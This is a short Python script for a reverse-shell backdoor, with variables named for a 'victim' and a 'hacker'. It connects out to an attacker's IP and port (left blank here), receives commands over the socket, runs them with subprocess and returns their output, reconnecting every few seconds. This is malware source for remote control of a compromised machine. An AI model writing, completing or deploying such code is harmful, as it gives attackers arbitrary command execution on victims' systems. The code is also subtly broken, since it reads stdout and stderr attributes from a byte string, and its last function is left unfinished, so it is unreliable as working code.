import socket
import subprocess
import os
import time
IDENTIFIER = "<END_OF_COMMAND_RESULT>"

def create_socket():
    hacker_IP, hacker_port = "", 0
    victim_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    hacker_address = (hacker_IP, hacker_port)
    victim_socket.connect(hacker_address)

    return victim_socket

def run_commands():

    while True:
        victim_socket = create_socket()
        try:
            while True:
                data = victim_socket.recv(1024)
                hacker_command = data.decode()

                if hacker_command == "kill":
                    break
                elif hacker_command == "":
                    continue
                else:
                    # output = subprocess.run(["powershell.exe", hacker_command], shell=True, capture_output=True)
                    output = subprocess.check_output(hacker_command.split(" "))

                    if output.stderr.decode("utf-8") == "":
                        command_result = output.stdout
                        command_result = command_result.decode("utf-8") + IDENTIFIER
                        command_result = command_result.encode("utf-8")
                    else:
                        command_result = output.stderr
                victim_socket.send(command_result)
        except KeyboardInterrupt:
            victim_socket.close()
        except Exception as err:
            print("Unable to connect: ", err)
            time.sleep(5)
    


def listen_for_data():
    victim_socket = create_socket()
    victim_socket.recv(1024)